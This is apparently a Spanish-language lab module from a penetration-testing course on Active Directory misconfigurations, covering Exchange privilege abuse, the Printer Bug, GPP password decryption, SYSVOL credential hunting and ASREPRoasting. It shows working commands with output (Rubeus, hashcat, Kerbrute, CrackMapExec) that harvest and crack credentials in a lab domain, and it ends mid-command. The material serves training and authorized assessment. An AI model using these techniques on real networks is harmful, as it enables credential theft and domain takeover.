Hay muchos otros ataques y errores de configuración interesantes que podemos encontrar durante una evaluación. Una comprensión amplia de los entresijos de AD nos ayudará a pensar fuera de la caja y descubrir problemas que otros probablemente pasen por alto.

---

## Scenario Setup

En esta sección, nos moveremos de un host de ataque Windows a uno Linux mientras trabajamos con varios ejemplos. Puedes iniciar los hosts para esta sección al final de la misma y RDP en el host de ataque MS01 Windows. Para las partes de esta sección que requieran interacción desde un host Linux, puedes abrir una consola de PowerShell en MS01 y SSH a `172.16.5.225` con las credenciales `htb-student:HTB_@cademy_stdnt!`.

---

## Exchange Related Group Membership

Una instalación por defecto de Microsoft Exchange dentro de un entorno AD (sin un modelo de administración dividido) abre muchas vectores de ataque, ya que Exchange a menudo recibe considerables privilegios dentro del dominio (a través de usuarios, grupos y ACLs). El grupo `Exchange Windows Permissions` no está listado como un grupo protegido, pero los miembros reciben la capacidad de escribir un DACL al objeto del dominio. Esto se puede aprovechar para otorgar privilegios DCSync a un usuario. Un atacante puede agregar cuentas a este grupo aprovechando una mala configuración de DACL (posible) o aprovechando una cuenta comprometida que sea miembro del grupo Account Operators. Es común encontrar cuentas de usuarios e incluso computadoras como miembros de este grupo. Los usuarios avanzados y el personal de soporte en oficinas remotas a menudo se agregan a este grupo, permitiéndoles restablecer contraseñas. Este [GitHub repo](https://github.com/gdedrouas/Exchange-AD-Privesc) detalla algunas técnicas para aprovechar Exchange y escalar privilegios en un entorno AD.

El grupo de Exchange `Organization Management` es otro grupo extremadamente poderoso (efectivamente los "Domain Admins" de Exchange) y puede acceder a los buzones de todos los usuarios del dominio. No es raro que los sysadmins sean miembros de este grupo. Este grupo también tiene control total de la OU llamada `Microsoft Exchange Security Groups`, que contiene el grupo `Exchange Windows Permissions`.

### Viewing Organization Management's Permissions

![image](https://academy.hackthebox.com/storage/modules/143/org_mgmt_perms.png)

Si podemos comprometer un servidor de Exchange, esto a menudo llevará a privilegios de Domain Admin. Además, volcar credenciales en memoria desde un servidor de Exchange producirá decenas, si no cientos, de credenciales en texto claro o hashes NTLM. Esto se debe a menudo a que los usuarios inician sesión en Outlook Web Access (OWA) y Exchange almacena en caché sus credenciales en memoria después de un inicio de sesión exitoso.

---

## PrivExchange

El ataque `PrivExchange` resulta de una falla en la función `PushSubscription` del Exchange Server, que permite a cualquier usuario del dominio con un buzón forzar al servidor Exchange a autenticarse con cualquier host proporcionado por el cliente a través de HTTP.

El servicio de Exchange se ejecuta como SYSTEM y está sobreprivilegiado por defecto (es decir, tiene privilegios WriteDacl en el dominio antes de la actualización acumulativa de 2019). Esta falla puede ser aprovechada para hacer relay a LDAP y volcar la base de datos NTDS del dominio. Si no podemos hacer relay a LDAP, esto se puede aprovechar para hacer relay y autenticarse en otros hosts dentro del dominio. Este ataque te llevará directamente a Domain Admin con cualquier cuenta de usuario autenticada en el dominio.

---

## Printer Bug

El Printer Bug es una falla en el protocolo MS-RPRN (Print System Remote Protocol). Este protocolo define la comunicación del procesamiento de trabajos de impresión y la gestión del sistema de impresión entre un cliente y un servidor de impresión. Para aprovechar esta falla, cualquier usuario del dominio puede conectarse a la tubería nombrada del spooler con el método `RpcOpenPrinter` y usar el método `RpcRemoteFindFirstPrinterChangeNotificationEx`, y forzar al servidor a autenticarse con cualquier host proporcionado por el cliente a través de SMB.

El servicio de spooler se ejecuta como SYSTEM y está instalado por defecto en los servidores Windows que ejecutan Desktop Experience. Este ataque se puede aprovechar para hacer relay a LDAP y otorgar a tu cuenta atacante privilegios DCSync para recuperar todos los hashes de contraseñas de AD.

El ataque también se puede usar para hacer relay de la autenticación LDAP y otorgar privilegios de Resource-Based Constrained Delegation (RBCD) para la víctima a una cuenta de computadora bajo nuestro control, dando así al atacante privilegios para autenticarse como cualquier usuario en la computadora de la víctima. Este ataque se puede aprovechar para comprometer un controlador de dominio en un dominio/bosque asociado, siempre que tengas acceso administrativo a un controlador de dominio en el primer dominio/bosque, y la confianza permita la delegación TGT, lo cual ya no es por defecto.

Podemos usar herramientas como el módulo `Get-SpoolStatus` de [esta](http://web.archive.org/web/20200919080216/https://github.com/cube0x0/Security-Assessment) herramienta (que se puede encontrar en el objetivo generado) o [esta](https://github.com/NotMedic/NetNTLMtoSilverTicket) herramienta para verificar máquinas vulnerables al [MS-PRN Printer Bug](https://blog.sygnia.co/demystifying-the-print-nightmare-vulnerability). Esta falla se puede usar para comprometer un host en otro bosque que tenga habilitada la delegación sin restricciones, como un controlador de dominio. Nos puede ayudar a atacar a través de trusts de bosques una vez que hemos comprometido un bosque.

### Enumerating for MS-PRN Printer Bug

```r
PS C:\htb> Import-Module .\SecurityAssessment.ps1
PS C:\htb> Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

ComputerName                        Status
------------                        ------
ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL   True
```

---

## MS14-068

Esto fue una falla en el protocolo Kerberos, que podría ser aprovechada junto con las credenciales de usuario del dominio estándar para elevar privilegios a Domain Admin. Un ticket de Kerberos contiene información sobre un usuario, incluido el nombre de cuenta, ID y pertenencia a grupos en el Privilege Attribute Certificate (PAC). El PAC está firmado por el KDC usando claves secretas para validar que el PAC no ha sido manipulado después de su creación.

La vulnerabilidad permitía que un PAC falsificado fuera aceptado por el KDC como legítimo. Esto se puede aprovechar para crear un PAC falso, presentando a un usuario como miembro del grupo Domain Administrators u otro grupo privilegiado. Se puede explotar con herramientas como el [Python Kerberos Exploitation Kit (PyKEK)](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek) o el toolkit Impacket. La única defensa contra este ataque es parchear. La máquina [Mantis](https://app.hackthebox.com/machines/98) en la plataforma Hack The Box muestra esta vulnerabilidad.

---

## Sniffing LDAP Credentials

Muchas aplicaciones e impresoras almacenan credenciales LDAP en su consola de administración web para conectarse al dominio. Estas consolas a menudo se dejan con contraseñas débiles o predeterminadas. A veces, estas credenciales se pueden ver en texto claro. Otras veces, la aplicación tiene una función de `test connection` que podemos usar para recopilar credenciales cambiando la dirección IP de LDAP a la de nuestro host de ataque y configurando un listener de `netcat` en el puerto 389 de LDAP. Cuando el dispositivo intenta probar la conexión LDAP, enviará las credenciales a nuestra máquina, a menudo en texto claro. Las cuentas utilizadas para conexiones LDAP a menudo son privilegiadas, pero si no, esto podría servir como un punto de entrada inicial en el dominio. Otras veces, se requiere un servidor LDAP completo para llevar a cabo este ataque, como se detalla en [este post](https://grimhacker.com/2018/03/09/just-a-printer/).

---

## Enumerating DNS Records

Podemos usar una herramienta como [adidnsdump](https://github.com/dirkjanm/adidnsdump) para enumerar todos los registros DNS en un dominio usando una cuenta de usuario válida del dominio. Esto es especialmente útil si la convención de nombres para los hosts devueltos en nuestra enumeración usando herramientas como `BloodHound` es similar a `SRV01934.INLANEFREIGHT.LOCAL`. Si todos los servidores y estaciones de trabajo tienen un nombre no descriptivo, nos dificulta saber exactamente qué atacar. Si podemos acceder a las entradas DNS en AD, podemos descubrir potencialmente registros DNS interesantes que apunten a este mismo servidor, como `JENKINS.INLANEFREIGHT.LOCAL`, que podemos usar para planificar mejor nuestros ataques.

La herramienta funciona porque, por defecto, todos los usuarios pueden listar los objetos hijo de una zona DNS en un entorno AD. Por defecto, la consulta de registros DNS usando LDAP no devuelve todos los resultados. Así que, al usar la herramienta `adidnsdump`, podemos resolver todos los registros en la zona y potencialmente encontrar algo útil para nuestro compromiso. El fondo y una explicación más detallada de esta herramienta y técnica se pueden encontrar en este [post](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/).

En la primera ejecución de la herramienta, podemos ver que algunos registros están en blanco, a saber `?,LOGISTICS,?`.

### Using adidnsdump

```r
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 

Password: 

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[+] Found 27 records
```

### Viewing the Contents of the records.csv File

```r
head records.csv 

type,name,value
?,LOGISTICS,?
AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,ForestDnsZones,dead:beef::231
A,ForestDnsZones,10.129.202.29
A,ForestDnsZones,172.16.5.240
A,ForestDnsZones,172.16.5.5
AAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,DomainDnsZones,dead:beef::231
A,DomainDnsZones,10.129.202.29
```

Si ejecutamos nuevamente con la opción `-r`, la herramienta intentará resolver los registros desconocidos realizando una consulta `A`. Ahora podemos

 ver que una dirección IP de `172.16.5.240` apareció para LOGISTICS. Si bien este es un ejemplo pequeño, vale la pena ejecutar esta herramienta en entornos más grandes. Podemos descubrir registros "ocultos" que pueden llevar a descubrir hosts interesantes.

### Using the -r Option to Resolve Unknown Records

```r
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r

Password: 

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[+] Found 27 records
```

### Finding Hidden Records in the records.csv File

```r
head records.csv 

type,name,value
A,LOGISTICS,172.16.5.240
AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,ForestDnsZones,dead:beef::231
A,ForestDnsZones,10.129.202.29
A,ForestDnsZones,172.16.5.240
A,ForestDnsZones,172.16.5.5
AAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,DomainDnsZones,dead:beef::231
A,DomainDnsZones,10.129.202.29
```

---

## Other Misconfigurations

Hay muchas otras configuraciones erróneas que se pueden utilizar para avanzar en tu acceso dentro de un dominio.

---

### Password in Description Field

Información sensible, como contraseñas de cuentas, a veces se encuentra en los campos `Description` o `Notes` de la cuenta de usuario y se puede enumerar rápidamente usando PowerView. Para dominios grandes, es útil exportar estos datos a un archivo CSV para revisarlos offline.

### Finding Passwords in the Description Field using Get-Domain User

```r
PS C:\htb> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}

samaccountname description
-------------- -----------
administrator  Built-in account for administering the computer/domain
guest          Built-in account for guest access to the computer/domain
krbtgt         Key Distribution Center Service Account
ldap.agent     *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!
```

---

## PASSWD_NOTREQD Field

Es posible encontrar cuentas de dominio con el campo [passwd_notreqd](https://ldapwiki.com/wiki/Wiki.jsp?page=PASSWD_NOTREQD) configurado en el atributo userAccountControl. Si esto está configurado, el usuario no está sujeto a la política de longitud de contraseña actual, lo que significa que podría tener una contraseña más corta o ninguna contraseña en absoluto (si se permiten contraseñas vacías en el dominio). Una contraseña puede establecerse como en blanco intencionalmente (a veces los administradores no quieren ser llamados fuera del horario para restablecer contraseñas de usuarios) o accidentalmente al presionar enter antes de ingresar una contraseña al cambiarla a través de la línea de comandos. Solo porque este flag esté configurado en una cuenta, no significa que no se haya establecido ninguna contraseña, solo que no se puede requerir una. Hay muchas razones por las cuales este flag puede estar configurado en una cuenta de usuario, una de ellas es que un producto de un proveedor configuró este flag en ciertas cuentas durante la instalación y nunca eliminó el flag después de la instalación. Vale la pena enumerar cuentas con este flag configurado y probar cada una para ver si no se requiere contraseña (he visto esto un par de veces en evaluaciones). También inclúyelo en el informe del cliente si el objetivo de la evaluación es ser lo más completo posible.

### Checking for PASSWD_NOTREQD Setting using Get-DomainUser

```r
PS C:\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

samaccountname                                                         useraccountcontrol
--------------                                                         ------------------
guest                ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
mlowe                                PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
ehamilton                            PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
$725000-9jb50uejje9f                       ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
nagiosagent                                                PASSWD_NOTREQD, NORMAL_ACCOUNT
```

---

## Credentials in SMB Shares and SYSVOL Scripts

El share SYSVOL puede ser un tesoro de datos, especialmente en organizaciones grandes. Podemos encontrar muchos scripts batch, VBScript y PowerShell dentro del directorio de scripts, que es legible por todos los usuarios autenticados en el dominio. Vale la pena explorar este directorio para buscar contraseñas almacenadas en scripts. A veces encontraremos scripts muy antiguos que contienen cuentas deshabilitadas o contraseñas antiguas, pero de vez en cuando encontraremos oro, así que siempre debemos explorar este directorio. Aquí, podemos ver un script interesante llamado `reset_local_admin_pass.vbs`.

### Discovering an Interesting Script

```r
PS C:\htb> ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts

    Directory: \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts


Mode                LastWriteTime         Length Name                                                                 
----                -------------         ------ ----                                                                 
-a----       11/18/2021  10:44 AM            174 daily-runs.zip                                                       
-a----        2/28/2022   9:11 PM            203 disable-nbtns.ps1                                                    
-a----         3/7/2022   9:41 AM         144138 Logon Banner.htm                                                     
-a----         3/8/2022   2:56 PM            979 reset_local_admin_pass.vbs  
```

Mirando más de cerca el script, vemos que contiene una contraseña para el administrador local incorporado en los hosts Windows. En este caso, valdría la pena verificar si esta contraseña sigue configurada en algún host del dominio. Podríamos hacer esto usando CrackMapExec y la opción `--local-auth` como se muestra en la sección `Internal Password Spraying - from Linux` de este módulo.

### Finding a Password in the Script

```r
PS C:\htb> cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs

On Error Resume Next
strComputer = "."
 
Set oShell = CreateObject("WScript.Shell") 
sUser = "Administrator"
sPwd = "!ILFREIGHT_L0cALADmin!"
 
Set Arg = WScript.Arguments
If  Arg.Count > 0 Then
sPwd = Arg(0) 'Pass the password as parameter to the script
End if
 
'Get the administrator name
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")

<SNIP>
```

---

## Group Policy Preferences (GPP) Passwords

Cuando se crea una nueva GPP, se crea un archivo .xml en el share SYSVOL, que también se almacena en caché localmente en los endpoints a los que se aplica la Group Policy. Estos archivos pueden incluir aquellos utilizados para:

- Mapear unidades (drives.xml)
- Crear usuarios locales
- Crear archivos de configuración de impresoras (printers.xml)
- Crear y actualizar servicios (services.xml)
- Crear tareas programadas (scheduledtasks.xml)
- Cambiar contraseñas de administrador local.

Estos archivos pueden contener una serie de datos de configuración y contraseñas definidas. El valor del atributo `cpassword` está cifrado con AES-256 bits, pero Microsoft [publicó la clave privada AES en MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN), que se puede usar para descifrar la contraseña. Cualquier usuario del dominio puede leer estos archivos, ya que están almacenados en el share SYSVOL, y todos los usuarios autenticados en un dominio, por defecto, tienen acceso de lectura a este share del controlador de dominio.

Esto se parcheó en 2014 [MS14-025 Vulnerability in GPP could allow elevation of privilege](https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30), para evitar que los administradores establezcan contraseñas usando GPP. El parche no elimina los archivos Groups.xml existentes con contraseñas de SYSVOL. Si eliminas la política GPP en lugar de desvincularla de la OU, la copia en caché en la computadora local permanece.

El XML se ve de la siguiente manera:

### Viewing Groups.xml

![image](https://academy.hackthebox.com/storage/modules/143/GPP.png)

Si recuperas el valor de cpassword manualmente, la utilidad `gpp-decrypt` se puede usar para descifrar la contraseña de la siguiente manera:

### Decrypting the Password with gpp-decrypt

```r
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

Password1
```

Las contraseñas de GPP se pueden localizar buscando o explorando manualmente el share SYSVOL o usando herramientas como [Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1), el módulo GPP Metasploit Post, y otros scripts de Python/Ruby que localizarán el GPP y devolverán el valor cpassword descifrado. CrackMapExec también tiene dos módulos para localizar y recuperar contraseñas GPP. Un consejo rápido a considerar durante los compromisos: a menudo, las contraseñas de GPP están definidas para cuentas heredadas, y por lo tanto, es posible que recuperes y descifres la contraseña de una cuenta bloqueada o eliminada. Sin embargo, vale la pena intentar rociar contraseñas internamente con esta contraseña (especialmente si es única). El reuso de contraseñas es generalizado, y la contraseña GPP combinada con el rociado de contraseñas podría resultar en un mayor acceso.

### Locating & Retrieving GPP Passwords with CrackMapExec

```r
crackmapexec smb -L | grep gpp

[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
```

También es posible encontrar contraseñas en archivos como Registry.xml cuando se configura el autologon a través de Group Policy. Esto puede ser configurado por varias razones para que una máquina inicie sesión automáticamente al arrancar. Si esto se configura a través de Group Policy y no localmente en el host, entonces cualquier persona en el dominio puede recuperar las credenciales almacenadas en el archivo Registry.xml creado para este propósito. Este es un problema separado de las contraseñas GPP, ya que Microsoft no ha tomado ninguna medida para bloquear el almacenamiento de estas credenciales en el SYSVOL en texto claro y, por lo tanto, son legibles por cualquier usuario autenticado en el dominio. Podemos buscar esto usando CrackMapExec con el módulo [gpp_autologin](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-gpp_autologin), o usando el script [Get-GPPAutologon.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1) incluido en PowerSploit.

### Using CrackMapExec's gpp_autologin Module

```r
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found SYSVOL share
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Searching for Registry.xml
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Found INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found credentials in INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['INLANEFREIGHT.LOCAL']
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']
```

En la salida anterior, podemos ver que hemos recuperado las credenciales para una cuenta llamada `guarddesk`. Esto puede haber sido configurado para que las estaciones de trabajo compartidas usadas por los guardias inicien sesión automáticamente al arrancar para acomodar a múltiples usuarios durante el día y la noche trabajando en diferentes turnos. En este caso, es probable que las credenciales sean de un administrador local, por lo que valdría la pena encontrar hosts donde podamos iniciar sesión como administrador y buscar datos adicionales. A veces podemos descubrir credenciales para un usuario altamente privilegiado o credenciales para una cuenta deshabilitada/una contraseña expirada que no nos sirve de nada.

Un tema que tocamos a lo largo de este módulo es el reuso de contraseñas. La mala higiene de contraseñas es común en muchas organizaciones, por lo que siempre que obtengamos credenciales, debemos verificar si podemos usarlas para acceder a otros hosts (como usuario de dominio o local), aprovechar cualquier derecho como ACLs interesantes, acceder a shares, o usar la contraseña en un ataque de rociado de contraseñas para descubrir el reuso de contraseñas y tal vez una cuenta que nos otorgue más acceso hacia nuestro objetivo.

---

## ASREPRoasting

Es posible obtener el Ticket Granting Ticket (TGT) para cualquier cuenta que

 tenga configurado el [Do not require Kerberos pre-authentication](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory). Muchas guías de instalación de proveedores especifican que su cuenta de servicio se configure de esta manera. El servicio de respuesta de autenticación (AS_REP) está cifrado con la contraseña de la cuenta, y cualquier usuario del dominio puede solicitarlo.

Con la preautenticación, un usuario ingresa su contraseña, que cifra una marca de tiempo. El controlador de dominio descifrará esto para validar que se usó la contraseña correcta. Si tiene éxito, se emitirá un TGT al usuario para futuras solicitudes de autenticación en el dominio. Si una cuenta tiene deshabilitada la preautenticación, un atacante puede solicitar datos de autenticación para la cuenta afectada y recuperar un TGT cifrado del controlador de dominio. Esto se puede someter a un ataque de contraseña offline usando una herramienta como Hashcat o John the Ripper.

### Viewing an Account with the Do not Require Kerberos Preauthentication Option

![image](https://academy.hackthebox.com/storage/modules/143/preauth_not_reqd_mmorgan.png)

ASREPRoasting es similar a Kerberoasting, pero implica atacar el AS-REP en lugar del TGS-REP. No se requiere un SPN. Esta configuración se puede enumerar con PowerView o herramientas integradas como el módulo de PowerShell AD.

El ataque en sí se puede realizar con el toolkit [Rubeus](https://github.com/GhostPack/Rubeus) y otras herramientas para obtener el ticket para la cuenta objetivo. Si un atacante tiene permisos `GenericWrite` o `GenericAll` sobre una cuenta, puede habilitar este atributo y obtener el ticket AS-REP para descifrarlo offline y recuperar la contraseña de la cuenta antes de deshabilitar nuevamente el atributo. Al igual que Kerberoasting, el éxito de este ataque depende de que la cuenta tenga una contraseña relativamente débil.

A continuación, se muestra un ejemplo del ataque. PowerView se puede usar para enumerar usuarios con su valor UAC configurado en `DONT_REQ_PREAUTH`.

### Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser

```r
PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

samaccountname     : mmorgan
userprincipalname  : mmorgan@inlanefreight.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```

Con esta información en mano, se puede usar la herramienta Rubeus para recuperar el AS-REP en el formato adecuado para el descifrado offline. Este ataque no requiere ningún contexto de usuario de dominio y se puede realizar solo con conocer el nombre SAM del usuario sin Kerberos preauth. Veremos un ejemplo de esto usando Kerbrute más adelante en esta sección. Recuerda, añade el flag `nowrap` para que el ticket no se envuelva en columnas y se recupere en un formato que podamos alimentar fácilmente en Hashcat.

### Retrieving AS-REP in Proper Format using Rubeus

```r
PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: AS-REP roasting

[*] Target User            : mmorgan
[*] Target Domain          : INLANEFREIGHT.LOCAL

[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=mmorgan))'
[*] SamAccountName         : mmorgan
[*] DistinguishedName      : CN=Matthew Morgan,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] Using domain controller: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL (172.16.5.5)
[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\mmorgan'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:
     $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:D18650F4F4E0537E0188A6897A478C55$0978822DEC13046712DB7DC03F6C4DE059A946485451AAE98BB93DFF8E3E64F3AA5614160F21A029C2B9437CB16E5E9DA4A2870FEC0596B09BADA989D1F8057262EA40840E8D0F20313B4E9A40FA5E4F987FF404313227A7BFFAE748E07201369D48ABB4727DFE1A9F09D50D7EE3AA5C13E4433E0F9217533EE0E74B02EB8907E13A208340728F794ED5103CB3E5C7915BF2F449AFDA41988FF48A356BF2BE680A25931A8746A99AD3E757BFE097B852F72CEAE1B74720C011CFF7EC94CBB6456982F14DA17213B3B27DFA1AD4C7B5C7120DB0D70763549E5144F1F5EE2AC71DDFC4DCA9D25D39737DC83B6BC60E0A0054FC0FD2B2B48B25C6CA
```

Luego podemos descifrar el hash offline usando Hashcat con el modo `18200`.

### Cracking the Hash Offline with Hashcat

```r
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:d18650f4f4e0537e0188a6897a478c55$0978822dec13046712db7dc03f6c4de059a946485451aae98bb93dff8e3e64f3aa5614160f21a029c2b9437cb16e5e9da4a2870fec0596b09bada989d1f8057262ea40840e8d0f20313b4e9a40fa5e4f987ff404313227a7bffae748e07201369d48abb4727dfe1a9f09d50d7ee3aa5c13e4433e0f9217533ee0e74b02eb8907e13a208340728f794ed5103cb3e5c7915bf2f449afda41988ff48a356bf2be680a25931a8746a99ad3e757bfe097b852f72ceae1b74720c011cff7ec94cbb6456982f14da17213b3b27dfa1ad4c7b5c7120db0d70763549e5144f1f5ee2ac71ddfc4dca9d25d39737dc83b6bc60e0a0054fc0fd2b2b48b25c6ca:Welcome!00
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:d18650f4f...25c6ca
Time.Started.....: Fri Apr  1 13:18:40 2022 (14 secs)
Time.Estimated...: Fri Apr  1 13:18:54 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   782.4 kH/s (4.95ms) @ Accel:32 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10506240/14344385 (73.24%)
Rejected.........: 0/10506240 (0.00%)
Restore.Point....: 10493952/14344385 (73.16%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: WellHelloNow -> W14233LTKM

Started: Fri Apr  1 13:18:37 2022
Stopped: Fri Apr  1 13:18:55 2022
```

Al realizar la enumeración de usuarios con `Kerbrute`, la herramienta recuperará automáticamente el AS-REP para cualquier usuario encontrado que no requiera preautenticación Kerberos.

### Retrieving the AS-REP Using Kerbrute

```r
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 04/01/22 - Ronnie Flathers @ropnop

2022/04/01 13:14:17 >  Using KDC(s):
2022/04/01 13:14:17 >  	172.16.5.5:88

2022/04/01 13:14:17 >  [+] VALID USERNAME:	 sbrown@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 jjones@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 tjohnson@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 jwilson@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 bdavis@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 njohnson@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 asanchez@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 dlewis@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 ccruz@inlanefreight.local
2022/04/01 13:14:17 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:400d306dda575be3d429aad39ec68a33$8698ee566cde591a7ddd1782db6f7ed8531e266befed4856b9fcbbdda83a0c9c5ae4217b9a43d322ef35a6a22ab4cbc86e55a1fa122a9f5cb22596084d6198454f1df2662cb00f513d8dc3b8e462b51e8431435b92c87d200da7065157a6b24ec5bc0090e7cf778ae036c6781cc7b94492e031a9c076067afc434aa98e831e6b3bff26f52498279a833b04170b7a4e7583a71299965c48a918e5d72b5c4e9b2ccb9cf7d793ef322047127f01fd32bf6e3bb5053ce9a4bf82c53716b1cee8f2855ed69c3b92098b255cc1c5cad5cd1a09303d83e60e3a03abee0a1bb5152192f3134de1c0b73246b00f8ef06c792626fd2be6ca7af52ac4453e6a

<SNIP>
```

Con una lista de usuarios válidos, podemos usar [Get-NPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) del toolkit Impacket para buscar todos los usuarios con preautenticación Kerberos no requerida. La herramienta recuperará el AS-REP en formato Hashcat para descifrado offline para cualquier usuario encontrado. También podemos alimentar una lista de palabras como `jsmith.txt` en la herramienta, arrojará errores para los usuarios que no existen, pero si encuentra alguno válido sin preautenticación Kerberos, entonces puede ser una buena manera de obtener un punto de entrada o avanzar en nuestro acceso, dependiendo de dónde nos encontremos en el curso de nuestra evaluación. Incluso si no podemos descifrar el AS-REP usando Hashcat, aún es bueno informar esto como un hallazgo a los clientes (solo de menor riesgo si no podemos descifrar la contraseña) para que puedan evaluar si la cuenta necesita esta configuración.

### Hunting for Users with Kerberoast Pre-auth Not Required

```r
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

